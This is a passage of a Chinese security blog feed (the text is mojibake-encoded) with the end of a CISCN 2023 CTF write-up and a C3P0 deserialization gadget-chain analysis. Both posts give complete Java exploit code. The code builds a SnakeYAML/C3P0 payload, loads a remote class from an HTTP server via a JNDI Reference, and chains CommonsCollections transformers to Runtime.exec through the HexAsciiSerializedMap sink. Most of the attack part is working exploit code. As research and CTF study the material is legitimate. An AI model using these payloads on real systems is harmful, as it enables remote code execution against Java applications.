class="hljs-params">(String user, String password)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PrintWriter <span class="hljs-title function_">getLogWriter</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLogWriter</span><span class="hljs-params">(PrintWriter out)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLoginTimeout</span><span class="hljs-params">(<span class="hljs-type">int</span> seconds)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getLoginTimeout</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Logger <span class="hljs-title function_">getParentLogger</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLFeatureNotSupportedException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;<br>        C3P0 c3P0=<span class="hljs-keyword">new</span> <span class="hljs-title class_">C3P0</span>();<br>        PoolBackedDataSourceBase poolBackedDataSourceBase=<span class="hljs-keyword">new</span> <span class="hljs-title class_">PoolBackedDataSourceBase</span>(<span class="hljs-literal">false</span>);<span class="hljs-comment">//æœ‰å‚æ„é€ æ–¹æ³•æ˜¯public</span><br>        Field connectionPoolDataSource=poolBackedDataSourceBase.getClass().getDeclaredField(<span class="hljs-string">&quot;connectionPoolDataSource&quot;</span>);<br>        connectionPoolDataSource.setAccessible(<span class="hljs-literal">true</span>);<br>        connectionPoolDataSource.set(poolBackedDataSourceBase,c3P0);<br>        String hex=byteArrayToHexString(serialize(poolBackedDataSourceBase));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!&lt;tag:yaml.org,2002:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&gt; &#123;userOverridesAsString: \&quot;HexAsciiSerializedMap:&quot;</span> + hex + <span class="hljs-string">&quot;;\&quot;&#125;&quot;</span>;<br>        System.out.println(poc);<br><span class="hljs-comment">//        Yaml yaml=new Yaml();</span><br><span class="hljs-comment">//        yaml.load(poc);</span><br><span class="hljs-comment">//        byte[] result=serialize(poolBackedDataSourceBase);</span><br><span class="hljs-comment">//        unserialize(result);</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] serialize(Object object) <span class="hljs-keyword">throws</span> IOException &#123;<br>        ByteArrayOutputStream byteArrayOutputStream=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        ObjectOutputStream outputStream=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        outputStream.writeObject(object);<br>        outputStream.close();<br>        <span class="hljs-keyword">return</span> byteArrayOutputStream.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span>  <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] s)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        ByteArrayInputStream byteArrayInputStream=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(s);<br>        ObjectInputStream objectInputStream=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(byteArrayInputStream);<br>        objectInputStream.readObject();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">byteArrayToHexString</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] byteArray)</span> &#123;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">byte</span> b : byteArray) &#123;<br>            sb.append(String.format(<span class="hljs-string">&quot;%02X&quot;</span>, b));<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> sb.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payloadè®°å¾—URLç¼–ç ï¼š</p><p><img src="/2024/08/05/%E4%BB%8ECISCN2023-%E5%8D%8E%E5%8C%97-normal-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805004855145.png" alt="image-20240805004855145"></p><p><img src="/2024/08/05/%E4%BB%8ECISCN2023-%E5%8D%8E%E5%8C%97-normal-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805004832508.png" alt="image-20240805004832508"></p><p>ç¯å¢ƒå˜é‡æ‹¿ä¸‹flagï¼š</p><p><img src="/2024/08/05/%E4%BB%8ECISCN2023-%E5%8D%8E%E5%8C%97-normal-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805004825368.png" alt="image-20240805004825368"></p><p>å‚è€ƒï¼š</p><p><a href="https://www.cnblogs.com/BUTLER/p/17473487.html">2023 ååŒ—åˆ†åŒºèµ› normal_snake - B0T1eR - åšå®¢å›­ (cnblogs.com)</a></p><p><a href="https://www.aiwin.fun/index.php/archives/1677/#cl-10">CTF-Javaé¢˜è®°å½• - é¦–é¡µ|Aiwin</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C3P0</title>
    <link href="/2024/08/05/C3P0/"/>
    <url>/2024/08/05/C3P0/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>C3P0æ˜¯JDBCçš„ä¸€ä¸ªè¿æ¥æ± ç»„ä»¶ï¼Œç±»ä¼¼çš„è¿æ¥æ± ç»„ä»¶è¿˜æœ‰Druidã€DBCP</p><blockquote><p>åœ¨æ‰§è¡ŒJDBCçš„CRUDæ“ä½œæ—¶ï¼Œè‹¥æ¯æ¬¡æ“ä½œéƒ½å»ºç«‹ä¸€æ¬¡æ–°çš„æ•°æ®åº“è¿æ¥åˆ°é”€æ¯ï¼Œå¼€é”€å°±å¤ªå¤§äº†ã€‚å› æ­¤é€šè¿‡è¿æ¥æ± ï¼ˆConnection Poolï¼‰å¤ç”¨åˆ›å»ºå¥½çš„è¿æ¥ã€‚</p><p><strong>C3P0</strong>æ˜¯ä¸€ä¸ªå¼€æºçš„JDBCè¿æ¥æ± ï¼Œå®ƒå®ç°äº†æ•°æ®æºå’ŒJNDIç»‘å®šï¼Œæ”¯æŒJDBC3è§„èŒƒå’ŒJDBC2çš„æ ‡å‡†æ‰©å±•ã€‚ ä½¿ç”¨å®ƒçš„å¼€æºé¡¹ç›®æœ‰Hibernateã€Springç­‰ã€‚</p></blockquote><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><h3 id="URLClassLoader-http-base"><a href="#URLClassLoader-http-base" class="headerlink" title="URLClassLoader - http base"></a>URLClassLoader - http base</h3><h4 id="PoolBackedDataSourceBase-writeObject"><a href="#PoolBackedDataSourceBase-writeObject" class="headerlink" title="PoolBackedDataSourceBase#writeObject"></a><code>PoolBackedDataSourceBase#writeObject</code></h4><p>é¦–å…ˆå°è¯•åºåˆ—åŒ–å½“å‰å¯¹è±¡çš„<code>connectionPoolDataSource</code>å±æ€§ï¼Œè‹¥æŠ›å‡º<code>NotSerializableException</code>å¼‚å¸¸ï¼Œå³ä¸èƒ½åºåˆ—åŒ–ï¼Œåˆ™catchè¿™ä¸ªå¼‚å¸¸ï¼Œå¹¶ç”¨<code>ReferenceIndirector.indirectForm</code>å¤„ç†åå†åºåˆ—åŒ–ã€‚</p><p><img src="/2024/08/05/C3P0/image-20240804232020746.png" alt="image-20240804232020746"></p><p><img src="/2024/08/05/C3P0/image-20240804232139501.png" alt="image-20240804232139501"></p><p>ä»¥ä¸Šå¯è§ï¼Œè°ƒç”¨<code>connectionPoolDataSource</code>å±æ€§çš„<code>getReference()</code>ï¼Œè¿”å›åä½œä¸ºå‚æ•°å°è£…è¿›<code>ReferenceSerialized</code>å¯¹è±¡ï¼Œè€Œ<code>ReferenceSerialized</code>å®ç°çš„æ¥å£<code>IndirectlySerialized</code>ç»§æ‰¿äº†<code>Serializable</code>æ¥å£ï¼Œå› æ­¤<code>ReferenceSerialized</code>å¯è¢«åºåˆ—åŒ–ã€‚</p><p><img src="/2024/08/05/C3P0/image-20240804232326973.png" alt="image-20240804232326973"></p><h4 id="PoolBackedDataSourceBase-readObject"><a href="#PoolBackedDataSourceBase-readObject" class="headerlink" title="PoolBackedDataSourceBase#readObject"></a><code>PoolBackedDataSourceBase#readObject</code></h4><p><img src="/2024/08/05/C3P0/image-20240804232650387.png" alt="image-20240804232650387"></p><p>è‹¥ä¼ è¿›æ¥çš„åºåˆ—åŒ–å¯¹è±¡æ˜¯ä¸Šæ–‡çš„<code>ReferenceSerialized</code>ï¼Œè¿™é‡Œè°ƒç”¨å…¶<code>getObject</code>æ–¹æ³•ï¼š</p><p><img src="/2024/08/05/C3P0/image-20240804232803817.png" alt="image-20240804232803817"></p><p>è·Ÿè¿›<code>ReferenceableUtils.referenceToObject()</code>ï¼š</p><p><img src="/2024/08/05/C3P0/image-20240804233055575.png" alt="image-20240804233055575"></p><p>refï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œçš„var0ï¼Œæ˜¯ä¹‹å‰åºåˆ—åŒ–æ—¶å€™å¯æ§çš„ï¼Œå¯ä»¥é€šè¿‡URLClassLoaderåŠ è½½å¹¶å®ä¾‹åŒ–è¿œç¨‹ç±»ã€‚</p><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><p>è¦è®©<code>connectionPoolDataSource</code>è¿™ä¸ªå±æ€§æ˜¯ä¸ªå®ç°<code>ConnectionPoolDataSource</code>ã€<code>Referenceable</code>ï¼ˆåé¢è¦è°ƒç”¨å®ƒçš„<code>getReference()</code>å†æ‹¿å»å°è£…åˆ°<code>ReferenceSerialized</code>ï¼‰è¿™ä¸¤ä¸ªæ¥å£çš„ç±»ã€‚é‡å†™<code>getReference()</code>æ–¹æ³•ï¼Œè®©å…¶<code>factoryLoaction</code>æŒ‡å‘æ¶æ„ç±»æ‰€åœ¨æœåŠ¡å™¨åœ°å€ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">evil</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ConnectionPoolDataSource</span>, Referenceable&#123;<br><br>    <span class="hljs-keyword">public</span> Reference <span class="hljs-title function_">getReference</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;calc&quot;</span>, <span class="hljs-string">&quot;calc&quot;</span>, <span class="hljs-string">&quot;http://127.0.0.1:9999/&quot;</span>);<br>    &#125;<br><span class="hljs-comment">// override</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ä½œä¸º<code>PoolBackedDataSourceBase</code>ï¼ˆè¿™ä¸ªç±»æœ¬èº«æœ‰å®ç°<code>Serializable</code>æ¥å£ï¼‰çš„<code>connectionPoolDataSource</code>å±æ€§ï¼Œç”±äºevilç±»æ²¡æœ‰å®ç°<code>Serializable</code>æ¥å£ï¼Œæ— æ³•ååºåˆ—åŒ–ã€‚</p><p>åœ¨è°ƒç”¨<code>writeObject</code>æ—¶ï¼Œè°ƒç”¨<code>evil</code>çš„<code>getReference()</code>æ–¹æ³•ï¼Œè¿”å›å€¼å°è£…è¿›å¯åºåˆ—åŒ–çš„<code>ReferenceSerialized</code>å¯¹è±¡ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;<br><br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> javax.naming.Referenceable;<br><span class="hljs-keyword">import</span> javax.sql.ConnectionPoolDataSource;<br><span class="hljs-keyword">import</span> javax.sql.PooledConnection;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> java.sql.SQLFeatureNotSupportedException;<br><span class="hljs-keyword">import</span> java.util.logging.Logger;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">PoolBackedDataSourceBase</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PoolBackedDataSourceBase</span>(<span class="hljs-literal">false</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;connectionPoolDataSource&quot;</span>);<br>        cp.setAccessible(<span class="hljs-literal">true</span>);<br>        cp.set(base, <span class="hljs-keyword">new</span> <span class="hljs-title class_">evil</span>());<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(base);<br>        oos.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">evil</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ConnectionPoolDataSource</span>, Referenceable&#123;<br><br>        <span class="hljs-keyword">public</span> Reference <span class="hljs-title function_">getReference</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;calc&quot;</span>, <span class="hljs-string">&quot;calc&quot;</span>, <span class="hljs-string">&quot;http://127.0.0.1:9999/&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">(String user, String password)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> PrintWriter <span class="hljs-title function_">getLogWriter</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLogWriter</span><span class="hljs-params">(PrintWriter out)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLoginTimeout</span><span class="hljs-params">(<span class="hljs-type">int</span> seconds)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getLoginTimeout</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> Logger <span class="hljs-title function_">getParentLogger</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLFeatureNotSupportedException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/08/05/C3P0/image-20240804235535113.png" alt="image-20240804235535113"></p><h4 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h4><p>PoolBackedDataSourceåœ¨åºåˆ—åŒ–æ—¶å¯ä»¥ä¼ å…¥ä¸€ä¸ªä»»æ„Referenceç±»ï¼Œåœ¨PoolBackedDataSourceååºåˆ—åŒ–æ—¶è¯¥Referenceç±»ä¸­æŒ‡å®šçš„å¯¹è±¡ä¼šè¢«URLClassLoaderè¿œç¨‹åŠ è½½å®ä¾‹åŒ–ã€‚</p><h3 id="hex-base-ä¸å‡ºç½‘åˆ©ç”¨"><a href="#hex-base-ä¸å‡ºç½‘åˆ©ç”¨" class="headerlink" title="hex base ä¸å‡ºç½‘åˆ©ç”¨"></a>hex base ä¸å‡ºç½‘åˆ©ç”¨</h3><p><code>WrapperConnectionPoolDataSourceBase#setuserOverridesAsString</code></p><p>çœ‹åˆ°setæ–¹æ³•åº”è¯¥ç«‹åˆ»è”æƒ³åˆ°fastjson</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">WrapperConnectionPoolDataSourceBaseæ˜¯æŠ½è±¡ç±»ï¼Œå…³æ³¨å…¶å­ç±»WrapperConnectionPoolDataSource<br></code></pre></td></tr></table></figure><p><code>setUserOverridesAsString</code>æœ€åèµ°åˆ°<code>C3P0ImplUtils.parseUserOverridesAsString(this.getUserOverridesAsString())</code>ï¼š</p><p><img src="/2024/08/05/C3P0/image-20240805000141646.png" alt="image-20240805000141646"></p><p>é¦–å…ˆå¯¹<code>userOverridesAsString</code>è¿›è¡Œæˆªå–ï¼Œè½¬ä¸º<code>byte[]</code>ï¼Œå†è°ƒç”¨<code>SerializableUtils.fromByteArray(serBytes)</code>ï¼Œè¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼š</p><h4 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">getPayLoad</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, transformerChain);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tiedMapEntry, <span class="hljs-string">&quot;xxx&quot;</span>);<br><br>        lazyMap.remove(<span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(transformerChain, transformers);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(expMap);<br>        oos.close();<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">ser</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;HexAsciiSerializedMap:&quot;</span> + bytesToHexString(baos.toByteArray()) + <span class="hljs-string">&quot;p&quot;</span>;<br>        <span class="hljs-type">WrapperConnectionPoolDataSource</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WrapperConnectionPoolDataSource</span>();<br>        <span class="hljs-comment">// Thread.sleep(1000*3);</span><br>        exp.setUserOverridesAsString(ser);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] toByteArray(InputStream in) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">byte</span>[] classBytes;<br>        classBytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[in.available()];<br>        in.read(classBytes);<br>        in.close();<br>        <span class="hljs-keyword">return</span> classBytes;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">bytesToHexString</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bArray)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">length</span> <span class="hljs-operator">=</span> bArray.length;<br>        <span class="hljs-type">StringBuffer</span> <span 